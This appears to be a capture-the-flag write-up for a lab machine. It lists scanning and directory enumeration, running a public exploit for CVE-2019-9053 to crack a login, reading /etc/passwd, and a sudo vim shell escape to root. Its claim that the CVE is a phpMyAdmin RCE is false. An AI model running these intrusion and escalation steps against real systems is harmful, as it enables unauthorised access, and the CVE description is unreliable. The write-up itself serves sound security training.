@@ -1,0 +1,95 @@
+To find the services running under port 1000 i did this command:
+
+nmap -p1-1000 10.10.172.58
+
+
+
+But before that I tried:
+nmap -sV -sT 10.10.172.58
+
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 3.0.3
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+
+Then after running gobuster:
+/simple               (Status: 301) [Size: 313] [--> http://10.10.172.58/simple/]
+
+
+I went to that page and found and link to log in:
+http://10.10.172.58/simple/admin/login.php
+
+
+
+After some research I found the CVE: CVE-2019-9053
+CVE-2019-9053 is a Remote Code Execution (RCE) vulnerability found in phpMyAdmin versions prior to 4.8.5. 
+It was discovered in February 2019 and involves unsanitized user input in the sql.php script that can be exploited to perform time-based blind SQL injection.
+
+
+
+I found the script to exploit this vulnerability in: https://www.exploit-db.com/exploits/46635
+But the script had some errors that I had to correct.
+I ran the script with the wordlist provided:
+python3 py.py -u http://10.10.172.58 --crack -w best110.txt
+
+And I was able to get the password and user.
+
+First I logged into the website but found no major things so the next question helped me to figure out that I had to log in using ssh through port 2222
+
+ssh user@<target_ip> -p 2222
+
+
+
+
+
+I found another user to asnwer one question with:
+cat /etc/passwd
+
+
+After that I had to use privilege escalation.
+So I ran:
+find / -perm -4000 2>/dev/null
+
+I didn't find anything interesting so I decided to ran another command I should've ran first:
+sudo -l
+
+$ sudo -l
+User mitch may run the following commands on Machine:
+    (root) NOPASSWD: /usr/bin/vim
+
+
+I investigated on: https://gtfobins.github.io/gtfobins/vim/
+And found this command:
+vim -c ':!/bin/sh'
+
+But I had to ran as sudo for it to work:
+sudo vim -c ':!/bin/sh'
+
+
+After that I searched for the flag in the usual suspect directory:
+/root
+
+And I found the flag!
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
